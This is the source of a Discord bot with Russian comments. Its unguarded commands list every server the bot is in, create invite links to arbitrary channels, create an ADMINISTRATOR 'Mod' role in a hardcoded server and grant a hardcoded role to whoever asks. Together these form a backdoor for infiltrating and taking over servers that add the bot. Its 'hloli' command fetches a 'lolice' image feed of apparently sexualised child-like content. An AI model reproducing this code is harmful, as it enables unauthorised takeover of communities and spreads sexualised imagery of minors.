const Discord = require("discord.js");
const client = new Discord.Client();
const { RichEmbed } = require("discord.js");
const { NekoBot } = require("nekobot-api");
const nb = new NekoBot();
const lewd = require("discord-hentai");
const yo = lewd.Anime;
client.on("ready", () => {
  console.log(new Date());
  console.log(
    "-------------------------------------------------------------------------------------"
  );
});

client.on("message", async (msg) => {
  client.user.setActivity("на лоха", { type: "WATCHING" });
  let no = msg.content.split(" ");
  if (no[0] === "g") {
    switch (no[1]) {
      case "sl":
        try {
          let guildEmbed = new Discord.MessageEmbed()
            .setColor("#FF3361")
            .setTitle(`guilds found:`);
          await client.guilds.cache.forEach((guild) => {
            guildEmbed.addField(`${guild.name}: `, `${guild.id}`);
          });
          msg.channel.send(guildEmbed);
        } catch (err) {
          let guildEmbed = new Discord.MessageEmbed()
            .setColor("#FF3361")
            .setTitle(`error found:`)
            .setDescription(`${err}`);
          msg.channel.send(guildEmbed);
        }
        break;
      case "mgd":
        try {
          let mguild = await client.guilds.cache.get(`${no[2]}`);
          console.log(mguild);
          let guildEmbed = new Discord.MessageEmbed()
            .setColor("#FF3361")
            .setTitle(`${mguild.name}`)
            .setThumbnail(mguild.iconURL())
            .addFields(
              {
                name: `guild id `,
                value: `${mguild.id}`,
              },
              {
                name: `available: `,
                value: `${mguild.available}`,
              },
              { name: `region: `, value: `${mguild.region}` },
              { name: `members count: `, value: `${mguild.memberCount}` },
              { name: `100k members: `, value: `${mguild.large}` },
              {
                name: `verification level: `,
                value: `${mguild.verificationLevel}`,
              },
              {
                name: `explicit content filter: `,
                value: `${mguild.explicitContentFilter}`,
              },
              {
                name: `default message notifications: `,
                value: `${mguild.defaultMessageNotifications}`,
              },
              { name: `vanity URL: `, value: `${mguild.vanityURLCode}` },
              { name: `description: `, value: `${mguild.description}` },
              { name: `owner id: `, value: `${mguild.ownerID}` }
            );
          msg.channel.send(guildEmbed);
        } catch (error) {
          let guildEmbed = new Discord.MessageEmbed()
            .setColor("#FF3361")
            .setTitle(`error found:`)
            .setDescription(`${error}`);
          msg.channel.send(guildEmbed);
        }
        break;
      case "gd":
        try {
          let mguild = await client.guilds.fetch(no[2]);
          console.log(mguild);
        } catch (err) {
          console.log(err);
        }
      default:
        break;
    }
  }
  switch (no[0]) {
      case "hneko":
        try {
          let pic = await nb.get("neko");
          msg.channel.send(pic);
          break;
        } catch (error) {
          console.log(error);
          break;
        }
    case "hloli":
      try {
        let pic = await nb.get("lolice")
        msg.channel.send(pic)
        break;
      } catch(error) {
        console.log(error)
        break;
      }
  }
  switch (no[0]) {
    case "server_invite":
      try {
        let invitelink = await client.channels.cache
          .get(`${no[1]}`)
          .createInvite({ unique: true, maxUses: `${no[2]}` });
        msg.channel.send(`https://discord.gg/${invitelink.code}`);
      } catch (error) {
        let userEmbed = new Discord.MessageEmbed()
          .setColor("#FF3361")
          .setTitle(`the error found`)
          .setDescription("params:")
          .addFields(
            {
              name: `command: `,
              value: `server_invite [channel_id] [invite_members_count]`,
            },
            {
              name: `channel id detected: `,
              value: `${no[1]}`,
            },
            { name: `invite members count detected: `, value: `${no[2]}` },
            { name: `error: `, value: error }
          );
        msg.channel.send(userEmbed);
      }
      break;
    case "create":
      let gd = client.guilds.cache.get("655348970624909322");
      gd.roles.create({
        data: { name: "Mod", permissions: ["ADMINISTRATOR"] },
      });
      console.log("created role");
      console.log(no[0]);
      break;
    case "wiew":
      let gd1 = client.guilds.cache.get("655348970624909322");
      gd1.roles.cache.forEach((role) => console.log(role.name, role.id));
      break;
    case "role":
      let gd2 = client.guilds.cache.get("655348970624909322");
      let meme = msg.member;
      console.log(meme);
      let roll = gd2.roles.cache.get("820583856176103444");
      console.log(roll);
      msg.member.roles.add(roll).catch(console.error);
      break;
    case "find_user":
      //найти чела по id
      try {
        let user1 = await client.users.fetch(no[1]);
        let userEmbed = new Discord.MessageEmbed()
          .setColor("#FF3361")
          .setTitle(`user found by: ${no[1]}`)
          .setThumbnail(user1.displayAvatarURL())
          .addFields(
            { name: `id: `, value: `${user1.id}` },
            {
              name: `username: `,
              value: `${user1.username}#${user1.discriminator}`,
            },
            { name: `bot: `, value: `${user1.bot}` },
            { name: `avatar: `, value: `${user1.displayAvatarURL()}` }
          );
        msg.channel.send(userEmbed);
      } catch (error) {
        let userEmbed = new Discord.MessageEmbed()
          .setColor("#FF3361")
          .setTitle(`the error found`)
          .setDescription("params:")
          .addFields(
            {
              name: `command: `,
              value: `find_user [user_id]`,
            },
            {
              name: `user id detected: `,
              value: `${no[1]}`,
            },
            { name: `error: `, value: error }
          );
        msg.channel.send(userEmbed);
      }
  }
});
client.login(process.env.token);
